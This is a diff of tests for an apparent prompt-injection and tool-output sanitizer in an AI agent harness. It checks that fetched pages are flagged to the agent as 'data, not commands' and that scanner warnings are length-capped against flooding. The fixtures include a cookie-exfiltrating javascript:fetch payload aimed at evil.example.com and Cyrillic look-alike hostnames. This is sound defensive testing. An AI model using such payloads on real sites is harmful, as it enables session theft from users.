@@ -5,6 +5,7 @@ import {
   sanitizeToolOutput,
   sanitizeToolOutputHook,
 } from './input-sanitizer';
+import type { SanitizationInfo } from '@/lib/sanitization';
 
 const ctx = { sessionId: 'test-session', source: 'user-message' };
 
@@ -15,6 +16,16 @@ const ESC = String.fromCharCode(0x1b); // ANSI escape introducer
 // exfil-shaped by the library's rules and yields no finding at all, which would
 // make these tests pass without exercising the advisory path.
 const EXFIL_URL = 'javascript:fetch("//evil.example.com?c="+document.cookie)';
+// A fetched page shape whose only finding is note-tier: the `<script>` is
+// preserved and merely described, so nothing is rewritten and no category is
+// emitted. Nearly every real web page looks like this.
+const SCRIPT_HTML = '<html><body><script>alert(1)</script><p>hello</p></body></html>';
+// Look-alike host names, built from a code point so no homoglyph hides in this
+// source file. The library reports each one by name in a single sentence, which
+// is what makes its message length attacker-scalable.
+const CYRILLIC_O = String.fromCharCode(0x043e);
+const manyConfusableHosts = (count: number): string =>
+  Array.from({ length: count }, (_, i) => `see https://g${CYRILLIC_O}ogle${i}.com/x`).join('\n');
 
 describe('sanitizeUntrustedInput', () => {
   it('passes clean text through unchanged with no findings', async () => {
@@ -163,6 +174,18 @@ describe('sanitizeToolOutput', () => {
     expect(changed).toBe(false);
     expect(output).toEqual(response);
     expect(found).toContain('exfil-urls');
+  });
+
+  it('collects note-tier messages for preserved content that carries no category', async () => {
+    // The library reports a preserved `<script>` at its quiet tier with no
+    // `found` category. Nothing is rewritten, so this is the case where the
+    // message is the entire finding.
+    const response = { stdout: SCRIPT_HTML, stderr: '' };
+    const { output, changed, found, messages } = await sanitizeToolOutput(response, toolCtx);
+    expect(changed).toBe(false);
+    expect(output).toEqual(response);
+    expect(found).toEqual([]);
+    expect(messages.join(' ')).toMatch(/data, not commands/);
   });
 
   it('preserves non-string scalars and null', async () => {
@@ -321,6 +344,91 @@ describe('sanitizeToolOutputHook (PostToolUse wiring)', () => {
     expect(findings[0].toolUseId).toBe('toolu_test');
     expect(findings[0].removed).toBe(true);
     expect(findings[0].found).toBeGreaterThan(0);
+  });
+
+  it('gives the agent the note for preserved scripting without substituting output', async () => {
+    const res = await sanitizeToolOutputHook(
+      postToolUse('WebFetch', { content: [{ type: 'text', text: SCRIPT_HTML }] }),
+      'test-session'
+    );
+    const out = hookOutput(res);
+    expect(out).not.toHaveProperty('updatedToolOutput');
+    const note = out.additionalContext ?? '';
+    expect(note).toMatch(/data, not commands/);
+    // ...and it must not claim a removal that didn't happen.
+    expect(note.toLowerCase()).not.toContain('removed');
+  });
+
+  it('does not badge a note-only finding', async () => {
+    // The other half of the asymmetry: the agent gets the sentence (above), the
+    // operator gets no badge on a page whose only sin is having a `<script>`.
+    const findings: unknown[] = [];
+    await sanitizeToolOutputHook(
+      postToolUse('WebFetch', { content: [{ type: 'text', text: SCRIPT_HTML }] }),
+      'test-session',
+      () => findings.push(true)
+    );
+    expect(findings).toHaveLength(0);
+  });
+
+  it('tells the agent about an exfil-shaped URL it deliberately left in place', async () => {
+    // Advisory-only: the URL survives, so there is no substitution — but the
+    // library's message is precisely the instruction not to follow it, and
+    // before this it never reached the agent at all.
+    const res = await sanitizeToolOutputHook(
+      postToolUse('WebFetch', { content: [{ type: 'text', text: `See [here](${EXFIL_URL})` }] }),
+      'test-session'
+    );
+    const out = hookOutput(res);
+    expect(out).not.toHaveProperty('updatedToolOutput');
+    expect(out.additionalContext ?? '').toMatch(/exfiltration/i);
+  });
+
+  it('uses the removal opening when both tiers fire on one response', async () => {
+    // A page can be rewritten *and* carry a preserved-content note. Only one
+    // opening can be right, and the removal did happen, so it wins — while the
+    // note-tier text still has to survive alongside it.
+    const res = await sanitizeToolOutputHook(
+      postToolUse('WebFetch', {
+        content: [{ type: 'text', text: `<script>alert(1)</script>he${ZWSP}llo` }],
+      }),
+      'test-session'
+    );
+    const out = hookOutput(res);
+    expect(out).toHaveProperty('updatedToolOutput');
+    const note = out.additionalContext ?? '';
+    expect(note.toLowerCase()).toContain('removed');
+    expect(note).toMatch(/data, not commands/);
+  });
+
+  it('caps the note so a hostile page cannot flood the agent with scanner text', async () => {
+    // The library enumerates every offending host in one sentence, so message
+    // length scales with a count the page controls. Left uncapped, this channel
+    // hands a fetched page a slice of the agent's context budget.
+    const response = {
+      content: [{ type: 'text', text: manyConfusableHosts(400) }],
+    };
+    // Non-vacuous: the underlying message really is far over budget.
+    const { messages } = await sanitizeToolOutput(response, toolCtx);
+    expect(messages.join(' ').length).toBeGreaterThan(10_000);
+
+    const findings: SanitizationInfo[] = [];
+    const res = await sanitizeToolOutputHook(
+      postToolUse('WebFetch', response),
+      'test-session',
+      (_id, info) => findings.push(info)
+    );
+    const note = hookOutput(res).additionalContext ?? '';
+    expect(note.length).toBeLessThan(2500);
+    // The library puts its "do not fetch these" clause after the enumeration, so
+    // a tail-truncated note has to restate it or the warning loses its point.
+    expect(note).toMatch(/truncated/);
+    expect(note).toMatch(/do not fetch/);
+    // The same text also goes to a SQLite row and an SSE frame, so the bound has
+    // to hold on the persisted copy too — not just the one the model reads.
+    expect(findings).toHaveLength(1);
+    expect(findings[0].warnings.join(' ').length).toBeLessThan(2500);
+    expect(findings[0].found).toContain('confusable-host');
   });
 
   it('does not report findings for clean output', async () => {
